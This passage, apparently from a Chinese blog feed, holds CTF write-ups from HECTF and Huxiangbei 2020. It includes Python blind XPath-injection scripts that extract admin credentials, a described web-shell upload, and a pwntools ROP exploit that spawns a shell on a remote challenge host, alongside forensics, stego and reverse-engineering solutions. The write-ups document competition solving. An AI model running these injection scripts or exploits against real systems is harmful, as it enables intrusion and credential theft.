punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"1' or substring(name(/!XXXX!*[position()=1]),"</span>        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=登录"</span>        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            flag<span class="token operator">=</span><span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"--------->"</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r\n"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># !####! 换成目录即可</span></code></pre><p>结果爆出第一级为root</p><img src="/article/2020-HECTF-Write-up/image-20201129161139719.png" class="" title="image-20201129161139719" loading="lazy"><p>同理，修改第13行为<code>&quot;1&#39; or substring(name(/root/*[position()=1]),&quot;</code><br>继续爆</p><img src="/article/2020-HECTF-Write-up/image-20201129161225253.png" class="" title="image-20201129161225253" loading="lazy"><img src="/article/2020-HECTF-Write-up/image-20201129161255235.png" class="" title="image-20201129161255235" loading="lazy"><img src="/article/2020-HECTF-Write-up/image-20201129161318627.png" class="" title="image-20201129161318627" loading="lazy"><p>最后爆出结构为/root/users/user[id]</p><p>开始猜测id为1的user节点下username值，其实能猜到的admin</p><p>payload：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> rebaseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"1' or substring(/root/users/user[id=1]/username,"</span>        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=登录"</span>        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            flag <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"位----------->"</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># 爆密码就把username改成password</span></code></pre><p>爆username</p><img src="/article/2020-HECTF-Write-up/image-20201129162416104.png" class="" title="image-20201129162416104" loading="lazy"><p>果然是admin</p><p>继续爆password</p><img src="/article/2020-HECTF-Write-up/image-20201129161907953.png" class="" title="image-20201129161907953" loading="lazy"><p>结果password=339db714647a1d66b85cd08442287841</p><p>登录一下，获得flag</p><img src="/article/2020-HECTF-Write-up/image-20201129161946397.png" class="" title="image-20201129161946397" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020hxb-Writeup</title>
      <link href="article/2020hxb-Writeup-cOMING/"/>
      <url>article/2020hxb-Writeup-cOMING/</url>
      
        <content type="html"><![CDATA[<h1 id="湖湘杯2020"><a href="#湖湘杯2020" class="headerlink" title="湖湘杯2020"></a>湖湘杯2020</h1><p>队伍情况</p><p>队伍名称：cOMING</p><img src="/article/2020hxb-Writeup-cOMING/b98885edfaae8f28a1142482b1c5a273.png" class="" loading="lazy"><p>队伍成员</p><p>gyy,Trick,hxq</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="题目名字不重要反正题挺简单的"><a href="#题目名字不重要反正题挺简单的" class="headerlink" title="题目名字不重要反正题挺简单的"></a>题目名字不重要反正题挺简单的</h3><p>直接白给phpinfo <a href="http://47.111.104.169:57301/?file=phpinfo">http://47.111.104.169:57301/?file=phpinfo</a></p><img src="/article/2020hxb-Writeup-cOMING/3374b2c0d3129c0282de5d456026c0f9.png" class="" loading="lazy"><h3 id="NewWebsite"><a href="#NewWebsite" class="headerlink" title="NewWebsite"></a>NewWebsite</h3><p>进网站找后台./admin/<br>输入用户名密码均为admin登陆成功,html发现有/?r=manageinfo，进入改头像，上传一句话木马，蚁剑连上可得flag</p><img src="/article/2020hxb-Writeup-cOMING/031b1eb11298e4c672f6e91a3b07b170.png" class="" loading="lazy"><p>91d7fbeecf940113dfca79a0194d8292</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h3><p><code>volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw  imageinfo</code></p><img src="/article/2020hxb-Writeup-cOMING/7b3aaf83f2a475ad5cab06c8856973c4.png" class="" loading="lazy"><p>内存取证 win7： <code>volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86_23418 hashdump</code></p><img src="/article/2020hxb-Writeup-cOMING/4d11382c75521a279254c1d8f939e7e2.png" class="" loading="lazy"><p>MD5解出</p><p>CTF：</p><p>aad3…：空密码</p><p>0a64…:qwer1234</p><p>再结合题目：we need sha1(password)!!! sha1</p><p>解密qwer1234</p><img src="/article/2020hxb-Writeup-cOMING/ee50c0fb45bc04ff9f82fad1289d5ec8.png" class="" loading="lazy"><p>出flag</p><h3 id="虚实之间"><a href="#虚实之间" class="headerlink" title="虚实之间"></a>虚实之间</h3><p>开文件发现<code>mingwen - 副本.txt</code>是伪加密,拖出来打包后明文攻击</p><p>爆破得密码：123%asd!O</p><img src="/article/2020hxb-Writeup-cOMING/1a7883d1491cfe53eb8d922f1251ee04.png" class="" loading="lazy"><pre class="language-none"><code class="language-none">仅需5，跳过去ffd5e341le25b2dcab15cbb&#125;gc3bc5b&#123;789b51</code></pre><p>联想栅栏加密 直接出flag</p><img src="/article/2020hxb-Writeup-cOMING/b510b2e1aae50a2ba791f6bac42dcdc2.png" class="" loading="lazy"><h3 id="颜文字"><a href="#颜文字" class="headerlink" title="颜文字"></a>颜文字</h3><p>东西很多，最终发现这有个.html是有用的</p><img src="/article/2020hxb-Writeup-cOMING/9302d47555b72dfa1fd14d8a8b8394e2.png" class="" loading="lazy"><p>打开，F12</p><img src="/article/2020hxb-Writeup-cOMING/f2ffd31423755c064eb38a0e7dc062f5.png" class="" loading="lazy"><p>发现base64</p><pre class="language-none"><code class="language-none">KO+9oe+9peKIgO+9pSnvvonvvp7ll6hIaX4gCm&#x3D;&#x3D;KO+8oF&#x2F;vvKA7KSjvvKBf77ygOyko77ygX++8oDspCr&#x3D;&#x3D;                            KCtfKyk&#x2F;KOOAgj7vuL88KV&#x2F;OuCjjgII+77i&#x2F;PClfzrgK                                  bygq77+j4pa977+jKinjg5bjgpwK                                      77yc77yI77y+77yN77y+77yJ77yeKOKVr+KWveKVsCAp5aW96aaZfn4K                  44O9KOKcv+++n+KWve++nynjg44o77yg77y+77yQ77y+KQp&#x3D;                    KF5e44Kezqgo77+j4oiA77+jKc6oKuKYhSzCsCo6LuKYhijvv6Pilr3vv6MpLyQ6Ki7CsOKYhSog44CCCp&#x3D;&#x3D;flwo4omn4pa94ommKS9+byhe4pa9XilvKMKs4oC&#x2F;wqwpKCriiafvuLbiiaYpKSjvv6Pilr3vv6MqICnjgp7ilLPilIHilLMo4pWv4oC14pah4oCyKeKVr++4teKUu+KUgeKUuwp&#x3D;4pSz4pSB4pSzIOODjigg44KcLeOCnOODjingsqBf4LKgCn&#x3D;&#x3D;                     4LKgX+CyoCjila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF&#x2F;CrCApCp&#x3D;&#x3D;KOODjuOBuO+&#x2F;o+OAgSlvKO+&#x2F;o+KUsO+&#x2F;oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+&#x2F;o++4v++&#x2F;oyko77+jzrUoI++&#x2F;oykKKO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo&#x3D;KMKsX8KsIiko77+j77mP77+j77ybKSjila&#x2F;CsOKWocKw77yJ4pWv77i1IOKUu+KUgeKUu+ODvSjjgpzilr3jgpzjgIAp77yNQzwoLzvil4c7KS9+KOODmO+9pV&#x2F;vvaUp44OY4pSz4pSB4pSzCu&#x3D;&#x3D;4LKgX+CyoCjila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF&#x2F;CrCApCo&#x3D;&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIMK4oqZ77mP4oqZ4oil44O9KCrjgII+0JQ8KW&#x2F;jgpwvKOOEkm&#x2F;jhJIpL35+KCNfPC0p77yI77ye5Lq677yc77yb77yJCo&#x3D;&#x3D;KOODjuOBuO+&#x2F;o+OAgSlvKO+&#x2F;o+KUsO+&#x2F;oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+&#x2F;o++4v++&#x2F;oyko77+jzrUoI++&#x2F;oykKKO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCm&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCs&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAp&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCr&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCt&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAr&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCi&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCn&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCp&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCq&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCl&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCl&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCi&#x3D;&#x3D;KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK                     KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK                   KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK             KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIo4pWv4oC14pah4oCyKeKVr+eCuOW8ue+8geKAouKAouKAoijila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIKZmxhZ+iiq+aIkeeCuOayoeS6huWTiOWTiOWTiC&#x3D;&#x3D;</code></pre><p>解密后：</p><pre class="language-none"><code class="language-none">(｡･∀･)ﾉﾞ嗨Hi~ (＠_＠;)(＠_＠;)(＠_＠;)(+_+)?(。&gt;︿&lt;)_θ(。&gt;︿&lt;)_θo(*￣▽￣*)ブ゜＜（＾－＾）＞(╯▽╰ )好香~~ヽ(✿ﾟ▽ﾟ)ノ(＠＾０＾)(^^ゞΨ(￣∀￣)Ψ*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。~\(≧▽≦)&#x2F;~o(^▽^)o(¬‿¬)(*≧︶≦))(￣▽￣* )ゞ┳━┳(╯‵□′)╯︵┻━┻┳━┳ ノ( ゜-゜ノ)ಠ_ಠಠ_ಠ(╯‵□′)╯炸弹！•••*～●(¬_¬ )(ノへ￣、)o(￣┰￣*)ゞ╰(艹皿艹 )（︶^︶）(* ￣︿￣)(￣ε(#￣)(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(¬_¬&quot;)(￣﹏￣；)(╯°□°）╯︵ ┻━┻ヽ(゜▽゜　)－C&lt;(&#x2F;;◇;)&#x2F;~(ヘ･_･)ヘ┳━┳ಠ_ಠ(╯‵□′)╯炸弹！•••*～●(¬_¬ )(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃⊙﹏⊙∥ヽ(*。&gt;Д&lt;)o゜&#x2F;(ㄒoㄒ)&#x2F;~~(#_&lt;-)（＞人＜；）(ノへ￣、)o(￣┰￣*)ゞ╰(艹皿艹 )（︶^︶）(* ￣︿￣)(￣ε(#￣)(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••flag被我炸没了哈哈哈</code></pre><p>空格和base64加密的颜文字</p><p>stegsnow解出现乱码</p><p>拿颜文字的base64跑base64隐写，得到秘钥<code>lorrie</code></p><p>连到自己的服务器上nc保存文件</p><img src="/article/2020hxb-Writeup-cOMING/24f08c5af60b185a313ee1463c9a4852.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/113c837089faeae4e4cbf169b26103f2.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/a6cd84af9e66703249e6d040b8378d79.png" class="" loading="lazy"><p><code>→_→</code>替换为<code>-</code>,<code>←_←</code>替换为<code>.</code>,去网站上解码</p><img src="/article/2020hxb-Writeup-cOMING/4be4b33a5bdc0c72d555bcf347fc81dd.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/f9ede18047cccbfc556a9c345a0beac0.png" class="" loading="lazy"><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="古典美"><a href="#古典美" class="headerlink" title="古典美++"></a>古典美++</h3><p>利用网站工具得维吉尼亚密码密钥</p><img src="/article/2020hxb-Writeup-cOMING/7623653b8d5fa7474f7a021105bcc064.png" class="" loading="lazy"><p>为<code>orderby</code> 生成MD5</p><img src="/article/2020hxb-Writeup-cOMING/5ac8fcc0d5536abdee804959d8a3c242.png" class="" loading="lazy"><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h3><p>exp:</p><pre class="language-none"><code class="language-none">from pwn import *from LibcSearcher import *context.log_level &#x3D; &#39;debug&#39;context.terminal&#x3D;[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]p &#x3D; remote(&#39;47.111.96.55&#39;,54606)elf &#x3D; ELF(&#39;.&#x2F;pwn_printf&#39;)read_plt &#x3D; elf.symbols[&#39;read&#39;]read_got &#x3D; elf.got[&#39;read&#39;]puts_plt &#x3D; elf.symbols[&#39;puts&#39;]puts_got &#x3D; elf.got[&#39;puts&#39;]pop_rdi &#x3D; 0x401213v_addr &#x3D; 0x4007C6scanf &#x3D; 0x4006A0pop_rsi_ret &#x3D; 0x401211p.recvuntil(&quot;You will find this game very interesting&quot;)for i in range(16):    p.sendline(&quot;32&quot;)payload1 &#x3D; b&#39;a&#39;*0x8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(0x40) + p64(v_addr)p.sendline(payload1)p.recvline()rrr &#x3D; p.recv(6)puts_addr &#x3D; u64(rrr.ljust(8,b&#39;\x00&#39;))print (hex(puts_addr))wri &#x3D; 0x06030A0payload2 &#x3D; b&#39;a&#39;*0x8 + p64(pop_rdi) + p64(0x0401D99 ) +p64(pop_rsi_ret) +p64(wri)+p64(0)+ p64(scanf) + p64(pop_rdi) + p64(8*4 )+ p64(v_addr+1)p.recv()n1 &#x3D; int(b&#39;&#x2F;bin&#39;[::-1].hex(),16)n2 &#x3D; int(b&#39;&#x2F;sh\x00&#39;[::-1].hex(),16)p.sendline(payload2)print(&quot;n1:&quot; + str(n1))sleep(0.3)p.sendline(str(n1))wri &#x3D; 0x06030A0+4sleep(0.5)payload2 &#x3D; b&#39;a&#39; * 0x8 + p64(pop_rdi) + p64(0x0401D99) + p64(pop_rsi_ret) + p64(wri) + p64(0) + p64(scanf) + p64(v_addr)p.send(payload2)p.sendline(str(n2))payload3 &#x3D; b&#39;a&#39; * 0x8 + p64(pop_rdi) + p64(0x06030A0) + p64(puts_addr-0x2a300)sleep(0.5)p.sendline(payload3)p.interactive()</code></pre><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>爆破，逐个击破。。。</p><p>easy_c++</p><p>IDA分析 一个信息</p><img src="/article/2020hxb-Writeup-cOMING/61a2caae7f31cbfc365432119425d6fd.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/565ff985b4b771d98409ec3233eb8309.png" class="" loading="lazy"><p>长度32</p><img src="/article/2020hxb-Writeup-cOMING/17aa83fa3a88db01f27c8fb3d41c5e5f.png" class="" loading="lazy"><p>exp：</p><pre class="language-none"><code class="language-none">public class Test &#123;    public static void main(String[] args) &#123;        String a &#x3D; &quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*&#123;*+*$|,&quot;;        char v11;        int v13;        for (int i &#x3D;0; i&lt;32; i++)        &#123;            v11 &#x3D; a.charAt(i);            v13 &#x3D; i ^ (int)v11;            System.out.print((char)v13);        &#125;    &#125;&#125;</code></pre><h3 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h3><p>反编译py</p><pre class="language-none"><code class="language-none">python3 pyinstxtractor.py ReMe.exe</code></pre><img src="/article/2020hxb-Writeup-cOMING/1393ddb113bda2babe004c8a7bd44c13.png" class="" loading="lazy"><p>010打开</p><img src="/article/2020hxb-Writeup-cOMING/38a8bb796f44edf49bb8ec9ae28a850c.png" class="" loading="lazy"><p>置换之后：</p><img src="/article/2020hxb-Writeup-cOMING/0b91b5d7322cfcb630981982098feea8.png" class="" loading="lazy"><p>改后缀：ReMe.pyc</p><pre class="language-none"><code class="language-none">uncompyle6 ReMe.pycλ uncompyle6 ReMe.pyc# uncompyle6 version 3.7.4# Python bytecode 3.7 (3394)# Decompiled from: Python 3.8.5 (tags&#x2F;v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]# Embedded file name: ReMe.py# Compiled at: 1995-09-28 00:18:56# Size of source mod 2**32: 272 bytesimport sys, hashlibcheck &#x3D; [ 